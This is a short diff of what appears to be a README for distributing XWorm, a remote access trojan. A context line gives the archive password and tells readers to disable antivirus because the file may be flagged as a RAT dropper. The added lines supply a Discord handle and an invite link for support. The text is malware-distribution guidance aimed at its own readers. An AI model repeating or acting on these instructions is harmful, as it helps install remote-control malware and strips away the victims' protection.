@@ -4,3 +4,5 @@ Password is Xworm and disable antivirus it may flag it being a rat (dropper) tha
 
 
 dm my discord sigma031_1 if you need anything!!!!!
+
+or join here! https://discord.gg/fCYG296b4E for help
